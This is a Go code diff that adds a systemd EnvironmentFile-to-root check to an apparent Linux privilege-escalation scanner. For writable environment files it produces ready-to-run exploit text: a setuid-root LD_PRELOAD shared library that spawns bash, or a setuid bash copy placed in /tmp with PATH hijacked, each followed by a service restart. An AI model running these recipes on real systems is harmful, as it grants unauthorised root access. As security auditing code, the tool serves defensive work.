@@ -42,6 +42,7 @@ func init() {
 		&PolkitDangerousRulesChain{},
 		&SuidWritableLibChain{},        // E4: SUID + Writable Library Path chain
 		&LogrotateRootChain{},          // E1: Logrotate → Root chain
+		&EnvFileRootChain{},            // E2: Systemd EnvironmentFile → Root chain
 	}
 }
 
@@ -866,6 +867,83 @@ func (c *LogrotateRootChain) Evaluate(report *models.ScanReport) []ChainResult {
 				})
 			}
 		}
+	}
+	return results
+}
+
+// ── CHAIN 18: Systemd EnvironmentFile → Root Code Execution (E2) ──────────────
+// Cross-references writable EnvironmentFile findings (from A6 scanner) to
+// confirm a root code-execution chain via service restart.
+//
+// Attack path:
+//  1. Attacker writes LD_PRELOAD=/tmp/evil.so (or PATH=/tmp:$PATH) into the
+//     writable env file referenced by a root-owned systemd service.
+//  2. Attacker triggers a service restart (if they have restart rights) OR
+//     waits for a reboot / scheduled restart.
+//  3. systemd exports the env vars into the service process which runs as root
+//     → the injected .so / binary executes with root privileges.
+type EnvFileRootChain struct{}
+
+func (c *EnvFileRootChain) Evaluate(report *models.ScanReport) []ChainResult {
+	var results []ChainResult
+	for _, ef := range report.EnvFileResults {
+		if !ef.IsWritable {
+			continue
+		}
+
+		var exploit string
+		switch ef.InjectionType {
+		case "LD_PRELOAD":
+			exploit = fmt.Sprintf(
+				"# Compile a malicious shared library:\n"+
+				"  echo 'void __attribute__((constructor)) init(){setuid(0);setgid(0);system(\"/bin/bash\");}' > /tmp/evil.c\n"+
+				"  gcc -shared -fPIC -o /tmp/evil.so /tmp/evil.c\n"+
+				"# Inject into env file and trigger restart:\n"+
+				"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
+				"  systemctl restart %s  # or wait for reboot",
+				ef.EnvFilePath, ef.ServiceName,
+			)
+		case "PATH":
+			exploit = fmt.Sprintf(
+				"# Place a malicious binary shadowing a command the service calls:\n"+
+				"  cp /bin/bash /tmp/evil && chmod +s /tmp/evil\n"+
+				"# Prepend /tmp to PATH in the env file and trigger restart:\n"+
+				"  sed -i 's|^PATH=|PATH=/tmp:|' %s\n"+
+				"  systemctl restart %s  # or wait for reboot",
+				ef.EnvFilePath, ef.ServiceName,
+			)
+		default:
+			exploit = fmt.Sprintf(
+				"# Inject LD_PRELOAD into the writable env file:\n"+
+				"  echo 'LD_PRELOAD=/tmp/evil.so' >> %s\n"+
+				"# Build evil.so: gcc -shared -fPIC -o /tmp/evil.so evil.c\n"+
+				"  systemctl restart %s  # or wait for service restart / reboot",
+				ef.EnvFilePath, ef.ServiceName,
+			)
+		}
+
+		riskLevel := "100% CONFIRMED"
+		if ef.RiskLevel == "HIGH" {
+			// /etc/default/* may be intentionally writable — downgrade to
+			// POTENTIAL so the chain is visible but not over-confident.
+			riskLevel = "POTENTIAL"
+		}
+
+		results = append(results, ChainResult{
+			Name: fmt.Sprintf(
+				"Writable EnvironmentFile '%s' (service: %s) → %s injection → root on restart",
+				ef.EnvFilePath, ef.ServiceName, ef.InjectionType,
+			),
+			RiskLevel: riskLevel,
+			Description: fmt.Sprintf(
+				"Service '%s' (unit: %s) loads environment from '%s' which is writable by the "+
+				"current user. Injecting LD_PRELOAD or PATH causes arbitrary code to execute "+
+				"as root the next time the service is restarted.",
+				ef.ServiceName, ef.ServiceFile, ef.EnvFilePath,
+			),
+			Exploit:    exploit,
+			TargetPath: ef.EnvFilePath,
+		})
 	}
 	return results
 }
